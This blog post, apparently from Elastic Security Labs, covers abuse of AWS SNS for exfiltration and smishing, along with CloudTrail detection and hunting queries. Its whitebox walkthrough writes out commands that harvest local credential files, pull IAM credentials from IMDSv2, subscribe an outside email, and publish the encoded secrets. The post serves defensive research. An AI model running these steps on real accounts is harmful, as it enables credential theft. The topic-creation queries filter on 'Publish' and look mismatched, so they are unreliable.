---
title: "AWS SNS Abuse: Data Exfiltration and Phishing"
slug: "aws-sns-abuse"
subtitle: "Exploring how adversaries abuse AWS SNS services and detection capabilities"
date: "2025-03-13"
description: "During a recent internal collaboration, we  dug into publicly known SNS abuse attempts and our knowledge of the data source to develop detection capabilities."
author:
  - slug: terrance-dejesus
image: "Security Labs Images 7.jpg"
category:
  - slug: security-research
  - slug: security-operations
---

# Preamble

Welcome to another installment of AWS detection engineering with Elastic. This article will dive into both how threat adversaries (TA) leverage AWS’ Simple Notification Service (SNS) and how to hunt for indicators of abuse using that data source.

Expect to learn about potential techniques threat adversaries may exercise in regards to SNS. We will also explore security best practices, hardening roles and access, as well as how to craft threat detection logic for SNS abuse.

This research was the result of a recent internal collaboration that required us to leverage SNS for data exfiltration during a whitebox exercise. During this collaboration, we became intrigued by how a simple publication and subscription (pub/sub) service could be abused by adversaries to achieve various actions on objectives. We dug into publicly known SNS abuse attempts and our knowledge of the data source to assemble this research about detection opportunities.

Do enjoy!

# Understanding AWS SNS

Before we get started on the details, let’s discuss what AWS SNS is to have a basic foundational understanding.

AWS SNS is a web service that allows users to send and receive notifications from the cloud. Think of it like a news feed service where a digital topic is created, those who are interested with updates subscribe via email, slack, etc. and when data is published to that topic, all subscribers are notified and receive it. This describes what is commonly referred to as a pub/sub service provided commonly by cloud service providers (CSP). In Azure, this is offered as [Web PubSub](https://azure.microsoft.com/en-us/products/web-pubsub), whereas GCP offers [Pub/Sub](https://cloud.google.com/pubsub#documentation). While the names of these services may slightly differ from platform to platform, the utility and purpose do not.

SNS provides two workflows, [application-to-person](https://docs.aws.amazon.com/sns/latest/dg/sns-user-notifications.html) (A2P) , and [application-to-application](https://docs.aws.amazon.com/sns/latest/dg/sns-system-to-system-messaging.html) (A2A) that serve different purposes. A2P workflows focus more on integral operation with AWS services such as Firehose, Lambda, SQS and more. However, for this article we are going to focus our attention on A2P workflows. As shown in the diagram below, an SNS topic is commonly created, allowing subscribers to leverage SMS, email or push notifications for receiving messages.

# ![](/assets/images/aws-sns-abuse/image5.png)

# ![](/assets/images/aws-sns-abuse/image12.png)

**Additional Features:**

**Filter Policies:** Subscribers can  define filtering rules to receive only a relevant subset of messages if they choose. These filter policies are defined in JSON format; specifying which attributes of a message the subscriber is interested in. SNS evaluates these policies server-side before delivery to determine which subscribers the messages should be sent to.

**Encryption**: SNS leverages [server-side encryption](https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html) (SSE) using AWS Key Management Service (KMS) to secure messages at rest. When encryption is enabled, messages are encrypted before being stored in SNS and then decrypted upon delivery to the endpoint. This is of course important for maintaining the security of Personal Identifiable Information (PII) or other sensitive data such as account numbers. Not to fear, although SNS only encrypts at rest, other protocols (such as HTTPS) handle encryption in transit, making it end-to-end (E2E).

**Delivery Retries and Dead Letter Queues (DLQs)**: SNS automatically retries message delivery to endpoints, such as SQS, Lambda, etc. in case of unexpected failures. However, messages that fail to deliver ultimately reside in [DLQs](https://docs.aws.amazon.com/sns/latest/dg/sns-dead-letter-queues.html), which is typically an AWS SQS queue enabling debugging for developers.

**Scalability**: AWS SNS is designed to handle massive message volumes, automatically scaling to accommodate increasing traffic without manual intervention. There are no upfront provisioning requirements, and you pay only for what you use, making it cost-effective for most organizations.

AWS SNS is a powerful tool for facilitating communication in cloud environments. For a deeper understanding, we recommend diving into the existing [documentation](https://docs.aws.amazon.com/sns/latest/dg/welcome.html) from AWS. However, its versatility and integration capabilities also make it susceptible to abuse. In the next section, we explore some scenarios where adversaries might leverage SNS for malicious purposes. 

# Whitebox Testing

Whitebox testing involves performing atomic emulations of malicious behavior in a controlled environment, with full visibility into the vulnerable or misconfigured infrastructure and its configurations. This approach is commonly employed in cloud environments to validate detection capabilities during the development of threat detection rules or models targeting specific tactics, techniques, and procedures (TTPs).. Unlike endpoint environments, where adversary simulations often involve detonating malware binaries and tools, cloud-based TTPs typically exploit existing API-driven services through "living-off-the-cloud" techniques, making this approach essential for accurate analysis and detection.

## Data Exfiltration via SNS

Exfiltration via SNS starts with creating a topic that serves as a proxy for receiving stolen data and delivering it to the external media source, such as email or mobile. Adversaries would then subscribe that media source to the topic so that any data received is forwarded to them. After this is staged, it is only a matter of packaging data and publishing it to the SNS topic, which handles the distribution. This method allows adversaries to bypass traditional data protection mechanisms such as network ACLs, and exfiltrate information to unauthorized external destinations.

**Example Workflow:**

* Land on EC2 instance and perform discovery of sensitive data, stage it for later  
* Leverage IMDSv2 and STS natively with the installed AWS CLI to get temporary creds  
* Create a topic in SNS and attach an external email address as a subscriber  
* Publish sensitive information to the topic, encoded in Base64 (or plaintext)  
* The external email address receives the exfiltrated data

![Visual workflow for data exfiltration via AWS SNS](/assets/images/aws-sns-abuse/image3.png)  

### Infrastructure Setup

For the victim infrastructure, we’ll use our preferred infrastructure-as-code (IaC) framework, Terraform. 

A [public gist](https://gist.github.com/terrancedejesus/a01aa8f75f715e6baa726a21fcdf2289) has been created, containing all the necessary files to follow this example.. In summary, these Terraform configurations deploy an EC2 instance in AWS within a public subnet. The setup includes a [user-data script](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html) that adds dummy credentials for sensitive data as environment variables, and installs the AWS CLI to emulate a compromised environment. Additionally, the EC2 instance is assigned an IAM role with permissions for `sns:Publish`, `sns:Subscribe` and `sns:CreateTopic`.

There are several potential ways an adversary might gain initial access to this EC2 instance, including exploiting vulnerable web applications for web shell deployment, using stolen SSH credentials, password spraying or credential stuffing. Within this particular example scenario; let’s assume the attacker gained initial entry via a vulnerable web application, and subsequently uploaded a web shell. The next goal in this case would be persistence via credential access.. This is commonly seen [in-the-wild](https://www.wiz.io/blog/wiz-research-identifies-exploitation-in-the-wild-of-aviatrix-cve-2024-50603) when adversaries target popular 3rd-party software or web apps such as Oracle WebLogic, Apache Tomcat, Atlassian Confluence, Microsoft Exchange and much more.

To get started, download the Terraform files from the gist. 

1. Adjust the variables in the `variables.tf` file to match your setup.  
   1. Add your whitelisted IPv4 addressfor trusted_ip_cidr  
   2. Add your local SSH key file path to public_key_path  
   3. Ensure the ami_id.default is the correct AMI-ID for your region  
2. Run `terraform init` in the folder to initialize the working directory. 

When ready, run `terraform apply` to deploy the infrastructure.

A few reminders:

* Terraform uses your AWS CLI default profile, so ensure you’re working with the correct profile in your AWS configuration.  
* The provided AMI ID is specific to the `us-east-1` region. If you're deploying in a different region, update the AMI ID accordingly in the `variables.tf` file.  
* Change `trusted_ip_cidr.default` in `variables.tf` from 0.0.0.0/0 (any IP) to your publicly known CIDR range.

![](/assets/images/aws-sns-abuse/image2.png)

*Terraform apply output*

Let’s SSH into our EC2 instance to ensure that our sensitive credentials were created from the user-data script. Note in the `outputs.tf` file, we ensured that the SSH command would be generated for us based on the key path and public IP of our EC2 instance. 

![Bash command output for credential check](/assets/images/aws-sns-abuse/image10.png)

With this infrastructure staged and confirmed, we can then move on to practical execution.

### The Workflow in Practice: Exfiltrating Sensitive Credentials

Let’s step through this workflow in practice, now that our infrastructure is established. As a reminder, the goal of our opportunistic adversary is to check for local credentials, grab what they can and stage the sensitive data locally. Since landing on this EC2 instance, we have identified the AWS CLI exists, and identified we have SNS permissions. Thus, we plan to create a SNS topic, register an external email as a subscriber and then exfiltrateour stolen credentials and other data as SNS messages.

Note: While this example is extremely simple, the goal is to focus on SNS as a methodology for exfiltration. The exact circumstances and scenario will differ depending on the specific infrastructure setup of the victim.

**Identify and Collect Credentials from Common Locations:**  
Our adversary will target GitHub credentials files and .env files locally with some good ol’ fashioned Bash scripting. This will take the credentials from these files and drop them into the `/tmp` temporary folder, staging them for exfiltration.

Command: cat /home/ubuntu/.github/credentials /home/ubuntu/project.env \> /tmp/stolen_creds.txt

![](/assets/images/aws-sns-abuse/image11.png)

**Stage Exfiltration Method by Creating SNS Topic**  
Let’s leverage the existing AWS CLI to create the SNS topic. As a reminder, this EC2 instance assumes the custom IAM role we created and attached, which allows it to create SNS topics and publish messages. Since the AWS CLI is pre-installed on our EC2 instance, it will retrieve temporary credentials from IMDSv2 for the assumed role when invoked. However, if this were not the case, an adversary could retrieve credentials natively with the following bash code. 

```
# Fetch the IMDSv2 token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Get the IAM role name
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Fetch the temporary credentials
CREDENTIALS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

# Extract the Access Key, Secret Key, and Token
AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Token')
```

Once this is complete, let’s attempt to create our SNS topic and the email address that will be used as our external receiver for the exfiltrated data.

Create Topic Command: ```TOPIC_ARN=$(aws sns create-topic --name "whitebox-sns-topic" --query 'TopicArn' --output text)```

Subscribe Command: ```aws sns subscribe --topic-arn "$TOPIC_ARN" --protocol email --notification-endpoint "adversary@protonmail.com"```

As shown above after the commands are run, we can then navigate to the inbox of the external email address to confirm subscription. Once confirmed, our external email address will now receive any messages sent to the `whitebox-sns-topic topic` which we plan to use for exfiltration.

![](/assets/images/aws-sns-abuse/image9.png)

**Exfiltrate Data via SNS Publish**  
At this point, we have gained access to an EC2 instance, snooped around to understand our environment, identified some services for abuse and some credentials that we want to obtain. Note that our previous steps could all have been accomplished via a simple Bash script that could be dropped on the compromised EC2 instance via our webshell, but this is broken down into individual steps for example purposes..

Next, we can take the data we stored in `/tmp/stolen_creds.txt`, base64 encode it and ship it to our adversary controlled email address via SNS.

Commands:

* Base64 encode contents: ```BASE64_CONTENT=$(base64 /tmp/stolen_creds.txt)``` 
* Publish encoded credentials to our topic: ```aws sns publish --topic-arn "$TOPIC_ARN" --message "$BASE64_CONTENT" --subject "Encoded Credentials from EC2"```

![](/assets/images/aws-sns-abuse/image7.png)

Once completed, we can simply check our inbox for these exfiltrated credentials.

![](/assets/images/aws-sns-abuse/image1.png)

Taking the payload from our message, we can decode it to see that it represents the credentials we found lying around on the EC2 instance.

![](/assets/images/aws-sns-abuse/image6.png)

As many adversaries may attempt to establish persistence or laterally move throughout the AWS environment and services, they would then be able to rely on this SNS topic to exfiltrate data for as long as permissions were in scope for the IAM user or role. Additionally, they could set up a recurring job that scans for data on this EC2 instance and continually exfiltrates anything interesting over time. There are many practical options in this scenario for additional chaining that could be done.

**Before continuing, we encourage you to use the following command to destroy your infrastructure once logging out of the SSH connection**: ```terraform destroy --auto-approve```

### Challenges for Adversaries:

Of course, there are many uncertaintiesin any whitebox testing that may prove as roadblocks or hurdles for a TA, both advanced and immature in knowledge, skills and abilities. It is also very dependent on the configuration and environment of the potential victim. Below are additional challenges that adversaries would face.

**Initial Access**: Gaining initial access to the EC2 instance is often the biggest hurdle. This could involve exploiting a vulnerable web application or 3rd-party service, using stolen SSH credentials, password spraying or credential stuffing, or leveraging other means such as social engineering or phishing. Without initial access, the entire attack chain is infeasible.

**Establishing an Active Session**: After gaining access, maintaining an active session can be difficult, especially if the environment includes robust endpoint protection or regular reboots that clear unauthorized activity. Adversaries may need to establish a persistent foothold using techniques like a webshell, reverse shell or an automated dropper script.

**AWS CLI Installed on the Instance**: The presence of the AWS CLI on a public-facing EC2 instance is uncommon and not considered a best practice. Many secure environments avoid pre-installing the AWS CLI, forcing adversaries to bring their own tools or rely on less direct methods to interact with AWS services.

**IAM Role Permissions**: The IAM role attached to the EC2 instance must include permissive policies for SNS actions (`sns:Publish`, `sns:Subscribe`, `sns:CreateTopic, sts:GetCallerIdentity`). Many environments restrict these permissions to prevent unauthorized use, and misconfigurations are often necessary for the attack to succeed. Best security practices such as principle-of-least-privilege (PoLP) would ensure the roles are set up with only necessary permissions.

**Execution of Malicious Scripts**: Successfully executing a script or running commands without triggering alarms (e.g., CloudTrail, GuardDuty, EDR agents) is a challenge. Adversaries must ensure their activities blend into legitimate traffic or use obfuscation techniques to evade detection.

### Advantages for Adversaries

Of course, while there are challenges for the adversary with these techniques, let’s consider some crucial advantages that they may have as well.

* **Blending In with Native AWS Services**: By leveraging AWS SNS for data exfiltration, the adversary's activity appears as legitimate usage of a native AWS flagship service. SNS is commonly used for notifications and data dissemination, making it less likely to raise immediate suspicion.  
* **Identity Impersonation via IAM Role**: Actions taken via the AWS CLI are attributed to the IAM role attached to the EC2 instance. If the role already has permissions for SNS actions and is used regularly for similar tasks, adversarial activity can blend seamlessly with expected operations.  
* **No Concerns with Security Groups or Network ACLs**: Since SNS communication occurs entirely within the confines of AWS, there’s no reliance on security group or Network ACL configurations. This bypasses traditional outbound traffic controls, ensuring the adversary's data exfiltration attempts are not blocked.  
* **Lack of Detections for SNS Abuse**: Abuse of SNS for data exfiltration is under-monitored in many environments. Security teams may focus on more commonly abused AWS services (e.g., S3 or EC2) and lack dedicated detections or alerts for unusual SNS activity, such as frequent topic creation or large volumes of published messages.  
* **Minimal Footprint with Non-Invasive Commands**: Local commands used by the adversary (e.g., `cat`, `echo`, `base64`) are benign and do not trigger endpoint detection and response (EDR) tools typically. These commands are common in legitimate administrative tasks, allowing adversaries to avoid detection on backend Linux systems.  
* **Efficient and Scalable Exfiltration**: SNS enables scalable exfiltration by allowing adversaries to send large amounts of data to multiple subscribers. Once set up, the adversary can automate periodic publishing of sensitive information with minimal additional effort.  
* **Persistent Exfiltration Capabilities**: As long as the SNS topic and subscription remain active, the adversary can use the infrastructure for ongoing exfiltration. This is especially true if the IAM role retains its permissions and no proactive monitoring is implemented.  
* **Bypassing Egress Monitoring and DLP**: Since the data is exfiltrated through SNS within the AWS environment, it bypasses traditional egress monitoring or data loss prevention solutions that focus on outbound traffic to external destinations.

# In-the-Wild Abuse

While whitebox scenarios are invaluable for simulating potential adversarial behaviors, it is equally important to ground these simulations with in-the-wild (ItW) threats. To this end, we explored publicly available research and identified a [key article](https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/) from SentinelOne describing a spam messaging campaign that leveraged AWS SNS. Using insights from this research, we attempted to replicate these techniques in a controlled environment to better understand their implications.

Although we will not delve into the attribution analysis outlined in SentinelOne’s research, we highly recommend reviewing their work for a deeper dive into the campaign’s origins. Instead, our focus is on the tools and techniques employed by the adversary to abuse AWS SNS for malicious purposes.

## Smishing and Phishing

Compromised AWS environments with pre-configured SNS services can serve as launchpads for smishing (SMS phishing) or phishing attacks. Adversaries may exploit legitimate SNS topics and subscribers to distribute fraudulent messages internally or externally, leveraging the inherent trust in an organization’s communication channels.

As detailed in SentinelOne’s [blog](https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/), the adversary employed a Python-based tool known as **SNS Sender**. This script enabled bulk SMS phishing campaigns by interacting directly with AWS SNS APIs using compromised AWS credentials. These authenticated API requests allowed the adversary to bypass common safeguards and send phishing messages in mass..

The [**SNS Sender script**](https://www.virustotal.com/gui/file/6d8c062c23cb58327ae6fc3bbb66195b1337c360fa5008410f65887c463c3428) leverages valid AWS access keys and secrets to establish authenticated API sessions via the AWS SDK. Armed with these credentials, adversaries can craft phishing workflows that include:

1. Establishing authenticated SNS API sessions via the AWS SDK.  
2. Enumerating and targeting lists of phone numbers to serve as phishing recipients.  
3. Utilizing a pre-registered Sender ID (if available) for spoofing trusted entities.  
4. Sending SMS messages containing malicious links, often impersonating a legitimate service.

![](/assets/images/aws-sns-abuse/image4.png)

Elastic Security Labs predicts that the use of one-off or commercially available tools for abusing cloud services, like SNS Sender, will continue to grow as a research focus. This underscores the importance of understanding these tools and their impact on cloud security.

### Weaponization and Pre-Testing Considerations

To successfully execute a phishing campaign at scale using AWS SNS, the adversary would have needed access to an already registered AWS End User Messaging organization. AWS restricts new accounts to SNS Sandbox Mode, which limits SMS sending to manually verified phone numbers. To bypass sandbox restrictions, adversaries would need access to an account already approved for production SMS messaging. The process of testing and weaponization would have required several key steps.

A fully configured AWS End User Messaging setup would require:

* An established origination identity (which includes a long code, toll-free number, or short code).  
* Regulatory approval through a brand registration process.  
* Carrier pre-approval for high-volume SMS messaging.

Without these pre-registered identifiers, AWS SNS messages may be deprioritized, blocked, or fail to send.

Before deploying a large-scale attack, adversaries would likely test SMS delivery using verified phone numbers within AWS SNS Sandbox Mode. This process requires:

* Manually verifying phone numbers before sending messages.  
* Ensuring their carrier allows AWS SNS sandbox messages, as some (like T-Mobile and Google Voice) frequently block AWS SNS sandbox verification SMS.  
* Testing delivery routes across different AWS regions to identify which countries permit custom Sender IDs or allow non-sandbox messages.

If an attacker’s test environment failed to receive SNS verification OTPs, they would likely pivot to a different AWS account or leverage a compromised AWS account that already had production-level messaging permissions.

In addition to this, the adversary would likely prioritize transactional messages over promotional. Transactional messages are prioritized by AWS (OTPs, security alerts, etc.) \- whereas promotional messages are lower priority and may be filtered or blocked by certain carriers.

If adversaries cannot override message type defaults, their phishing messages may be deprioritized or rejected by AWS, which could be a hurdle.

**Registered Origination Identity & Sender ID (If Supported)**

AWS requires brand registration and origination identity verification for businesses sending high-volume SMS messages. Depending on the region and carrier, adversaries may be able to exploit different configurations:

* **Sender ID Abuse**: In some non-U.S. regions, adversaries could register a Sender ID to make phishing messages appear from a trusted entity. This may allow for spoofing banks, shipping companies, or government agencies, making the phishing attempt more convincing.  
* **Long Code & Toll-Free Exploitation**: AWS SNS assigns long codes (standard phone numbers) or toll-free numbers for outbound SMS. Toll-free numbers require registration but could still be abused if an adversary compromises an AWS account with an active toll-free messaging service.  
* **Short Code Restrictions**: High-throughput short codes (5- or 6-digit numbers) are often carrier-controlled and require additional vetting, making them less practical for adversaries.

### **Infrastructure Setup**

By default, AWS accounts that have not properly configured the [End User Messaging](https://docs.aws.amazon.com/sms-voice/latest/userguide/what-is-sms-mms.html) service are restricted to an [**SMS sandbox**](https://aws.amazon.com/blogs/compute/introducing-the-sms-sandbox-for-amazon-sns/). This sandbox allows developers to test SMS functionality by sending messages to verified phone numbers. However, as we discovered, the process of verifying numbers in the sandbox is fraught with challenges.

Despite repeated attempts to register phone numbers with the sandbox, we found that verification messages (OTP codes) failed to arrive at endpoints across various carriers and services, including Google Voice and Twilio. This suggests that mobile carriers may block these sandbox-originated messages, effectively stalling the verification process but ultimately blocking us from emulating the behavior.

For production use, [migrating](https://docs.aws.amazon.com/sns/latest/dg/sns-sms-sandbox-moving-to-production.html) from the sandbox requires a fully configured AWS End User Messaging service. This includes:

* A legitimate Sender ID.  
* A phone pool for failovers.  
* Origination identity.  
* Brand registration for regulatory compliance.

This setup aligns with the requirements of the SNS Sender script and represents an ideal environment for adversaries. The use of a Sender ID, which relies on a pre-established [origination identity](https://docs.aws.amazon.com/sns/latest/dg/channels-sms-originating-identities.html) and brand registration, allows phishing messages to appear as though they originate from a reputable organization. This reduces the likelihood of detection or carrier-level blocking, increasing the success rate of the campaign.

The requirements for this attack suggests adversaries are likely to target companies that use AWS End User Messaging for automated SMS alerts and messaging. Industries such as logistics and delivery services, e-commerce platforms, and travel and hospitality are prime targets due to their reliance on automated SMS notifications.

On the recipient's side, the phishing message appears as if it originates from a trusted entity, bypassing carrier alarms and evading suspicion.

During our testing, we encountered unexpected behavior with logging in CloudTrail when attempting to use the script and AWS CLI to send SMS messages directly through SNS. Failed message delivery attempts did not appear in CloudTrail logs as expected.

Although the [**Publish**](https://docs.aws.amazon.com/sns/latest/api/API_Publish.html) API call is generally logged in CloudTrail (provided data plane events are enabled), it remains unclear if the absence of logs for failed attempts was due to inherent SNS behavior or misconfiguration on our part. This gap highlights the need for deeper investigation into how failed SNS Publish requests are handled by AWS and whether additional configurations are required to capture these events reliably.

As a result, we determined it would be best to include a threat hunting query for this rather than a detection rule due to the inability to fully replicate the adversary behavior, reliance on pre-established and registered brands and origination identity, in full. 

# Detection and Hunting Opportunities

For detection and hunting, CloudTrail audit logs provide enough visibility for the subsequent API calls from this activity. They also include enough contextual information to help aid with a higher fidelity of these anomalous signals. The following detections and hunting queries will leverage CloudTrail data ingested into our Elastic stack with the AWS CloudTrail integration, however they should be translatable to the SIEM of your choice if needed. For this activity, we focus solely on assumed roles, specifically those with EC2 instances being abused but this could take place elsewhere in AWS environments.

## SNS Topic Created by Rare User

[Detection Rule Source](https://github.com/elastic/detection-rules/blob/c5523c4d4060555e143b2d46fea1748173352b8f/rules/integrations/aws/resource_development_sns_topic_created_by_rare_user.toml)  
[Hunting Query Source](https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_topic_created_by_rare_user.md)  
MITRE ATT\&CK: [T1608](https://attack.mitre.org/techniques/T1608/)

Identifies when an SNS topic is created by a rare AWS user identity ARN (IAM User or Role). This detection leverages Elastic’s New Terms type rules to identify when the first occurrence of a user identity ARN creates an SNS topic. It would be awfully unusual for an assumed role, typically leveraged for EC2 instances to be creating SNS topics.

Our query leverages KQL and [New Terms rule type](https://www.elastic.co/guide/en/security/current/rules-ui-create.html#create-new-terms-rule) to focus on topics created by an Assumed Role specifically for an EC2 instance.

```
event.dataset: "aws.cloudtrail"
    and event.provider: "sns.amazonaws.com"
    and event.action: "Publish"
    and aws.cloudtrail.user_identity.type: "AssumedRole"
    and aws.cloudtrail.user_identity.arn: *i-*
```

### Hunting Query (ES|QL)  

Our hunting query focuses on the CreateTopic API action from an entity whose identity type is an assumed role. We also parse the ARN to ensure that it is an EC2 instance this request is sourcing from. We can then aggregate on cloud account, entity (EC2 instance ID), assumed role name, region and user agent. If it is unusual for the EC2 instance reported to be creating SNS topics randomly, then it may be a good anomalous signal to investigate.

```
from logs-aws.cloudtrail-*
| where @timestamp > now() - 7 day
| WHERE
    event.dataset == "aws.cloudtrail" AND
    event.provider == "sns.amazonaws.com" AND
    event.action == "Publish"
    and aws.cloudtrail.user_identity.type == "AssumedRole"
| DISSECT aws.cloudtrail.request_parameters "{%{?message_key}=%{message}, %{?topic_key}=%{topic_arn}}"
| DISSECT aws.cloudtrail.user_identity.arn "%{?}:assumed-role/%{assumed_role_name}/%{entity}"
| DISSECT user_agent.original "%{user_agent_name} %{?user_agent_remainder}"
| WHERE STARTS_WITH(entity, "i-")
| STATS regional_topic_publish_count = COUNT(*) by cloud.account.id, entity, assumed_role_name, topic_arn, cloud.region, user_agent_name
| SORT regional_topic_publish_count ASC
```

Hunting Notes:

* It is unusual already for credentials from an assumed role for an EC2 instance to be creating SNS topics randomly.  
* If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.  
* An attacker could pivot into Publish API actions being called to this specific topic to identify which AWS resource is publishing messages. With access to the topic, the attacker could then further investigate the subscribers list to identify unauthorized subscribers.

## SNS Topic Subscription with Email by Rare User

[Detection Rule Source](https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/exfiltration_sns_email_subscription_by_rare_user.toml)  
[Hunting Query Source](https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_email_subscription_by_rare_user.md)  
MITRE ATT&CK: [T1567](https://attack.mitre.org/techniques/T1567/), [T1530](https://attack.mitre.org/techniques/T1530/)

Identifies when an SNS topic is subscribed to by a rare AWS user identity ARN (IAM User or Role). This detection leverages Elastic’s **New Terms** type rules to identify when the first occurrence of a user identity ARN attempts to subscribe to an existing SNS topic.The data exfiltration which took place during our whitebox testing example above would have been caught by this threat hunt; an alert would have been generated when we establish an SNS subscription to an external user.  

Further false-positive reductions could be obtained by whitelisting expected organization TLDs in the requested email address if the topic is meant for internal use only.

Our query leverages KQL and New Terms rule type to focus on subscriptions that specify an email address. Unfortunately, CloudTrail redacts the email address subscribed or this would be vital for investigation.

```
event.dataset: "aws.cloudtrail"
    and event.provider: "sns.amazonaws.com"
    and event.action: "Subscribe"
    and aws.cloudtrail.request_parameters: *protocol=email*
```

**New Terms value**: aws.cloudtrail.user_identity.arn

### Hunting Query (ES|QL)

Our hunting query leverages ES|QL but parses the Subscribe API action parameters to filter further on the email protocol being specified. It also parses out the name of the user-agent, but relies further on aggregations to potentially identify other anomalous user-agent attributes. We've also included the region where the subscription occurred, as it may be uncommon for certain regions to be subscribed to others, depending on the specific business context of an organization.

```
from logs-aws.cloudtrail-*
| where @timestamp > now() - 7 day
| WHERE
    event.dataset == "aws.cloudtrail" AND
    event.provider == "sns.amazonaws.com" AND
    event.action == "Subscribe"
| DISSECT aws.cloudtrail.request_parameters "%{?protocol_key}=%{protocol}, %{?endpoint_key}=%{redacted}, %{?return_arn}=%{return_bool}, %{?topic_arn_key}=%{topic_arn}}"
| DISSECT user_agent.original "%{user_agent_name} %{?user_agent_remainder}"
| WHERE protocol == "email"
| STATS regional_topic_subscription_count = COUNT(*) by aws.cloudtrail.user_identity.arn, cloud.region, source.address, user_agent_name
| WHERE regional_topic_subscription_count == 1
| SORT regional_topic_subscription_count ASC
```

Hunting Notes:

* If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.  
* Ignoring the topic ARN during aggregation is important to identify first occurrence anomalies of subscribing to SNS topic with an email. By not grouping subscriptions by topic ARN, we ensure that the query focuses on detecting unexpected or infrequent subscriptions only, regardless of specific topics already established.  
* Another query may be required with the user identity ARN as an inclusion filter to identify which topic they subscribed to.  
* If an anomalous user-agent name is observed, a secondary investigation into the user-agent string may be required to determine if it's associated with automated scripts, uncommon browsers, or mismatched platforms. While it is simple to fake these, adversaries have been known not to for undisclosed reasons.

## SNS Topic Message Published by Rare User

[Detection Rule Source](https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/lateral_movement_sns_topic_message_publish_by_rare_user.toml)  
[Hunting Query Source](https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_topic_message_published_by_rare_user.md)

Identifies when a message is published to an SNS topic from an unusual user identity ARN in AWS. If the role or permission policy does not practice PoLP, publishing to SNS topics may be allowed and thus abused. For example, default roles supplied via AWS Marketplace that allow publishing to SNS topics. It may also identify rogue entities that once were pushing to SNS topics but no longer are being abused if credentials are compromised. Note that this focuses solely on EC2 instances, but you could adjust to account for different publish anomalies based on source, region, user agent and more.

Our query leverages KQL and New Terms rule type to focus on subscriptions that specify an email address. Unfortunately, CloudTrail redacts the email address subscribed, as this would be a vital asset for investigation.

```
event.dataset: "aws.cloudtrail"
    and event.provider: "sns.amazonaws.com"
    and event.action: "Publish"
    and aws.cloudtrail.user_identity.type: "AssumedRole"
    and aws.cloudtrail.user_identity.arn: *i-*
```

**New Terms value**: aws.cloudtrail.user_identity.arn

### Hunting Query (ES|QL)

 Our hunting query leverages ES|QL and also focused on SNS logs where the API action is *Publish*. This only triggers if the user identity type is an assumed role and the user identity ARN is an EC2 instance ID. Aggregating on **account ID**, **entity**, **assumed role**, **SNS topic** and **region** help us identify any further anomalies based on expectancy of this activity. We can leverage the user agent to identify these calls being made by unusual tools or software as well.

```
from logs-aws.cloudtrail-*
| where @timestamp > now() - 7 day
| WHERE
    event.dataset == "aws.cloudtrail" AND
    event.provider == "sns.amazonaws.com" AND
    event.action == "Publish"
    and aws.cloudtrail.user_identity.type == "AssumedRole"
| DISSECT aws.cloudtrail.request_parameters "{%{?message_key}=%{message}, %{?topic_key}=%{topic_arn}}"
| DISSECT aws.cloudtrail.user_identity.arn "%{?}:assumed-role/%{assumed_role_name}/%{entity}"
| DISSECT user_agent.original "%{user_agent_name} %{?user_agent_remainder}"
| WHERE STARTS_WITH(entity, "i-")
| STATS regional_topic_publish_count = COUNT(*) by cloud.account.id, entity, assumed_role_name, topic_arn, cloud.region, user_agent_name
| SORT regional_topic_publish_count ASC
```

Hunting Notes:

* If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.  
* If you notice Terraform, Pulumi, etc. it may be related to testing environments, maintenance or more.  
* Python SDKs that are not AWS, may indicate custom tooling or scripts being leveraged.

## SNS Direct-to-Phone Messaging Spike

[Hunting Query Source](https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_direct_to_phone_messaging_spike.md)  
MITRE ATT\&CK: [T1660](https://attack.mitre.org/techniques/T1660/)

Our hunting efforts for hypothesized SNS compromise—where an adversary is conducting phishing (smishing) campaigns—focus on *Publish* API actions in AWS SNS. Specifically, we track instances where *phoneNumber* is present in request parameters, signaling that messages are being sent directly to phone numbers rather than through an SNS topic.

Notably, instead of relying on SNS topics with pre-subscribed numbers, the adversary exploits an organization’s production Endpoint Messaging permissions, leveraging:

* An approved Origination ID (if the organization has registered one).  
* A Sender ID (if the adversary controls one or can spoof a trusted identifier).  
* AWS long codes or short codes (which may be dynamically assigned).

Since AWS SNS sanitizes logs, phone numbers are not visible in CloudTrail, but deeper analysis in CloudWatch or third-party monitoring tools may help.

### Hunting Query (ES|QL)

This query detects a spike in direct SNS messages, which may indicate smishing campaigns from compromised AWS accounts.

```
from logs-aws.cloudtrail-*
| WHERE @timestamp > now() - 7 day
| EVAL target_time_window = DATE_TRUNC(10 seconds, @timestamp)
| WHERE
    event.dataset == "aws.cloudtrail" AND
    event.provider == "sns.amazonaws.com" AND
    event.action == "Publish" AND
    event.outcome == "success" AND
    aws.cloudtrail.request_parameters LIKE "*phoneNumber*"
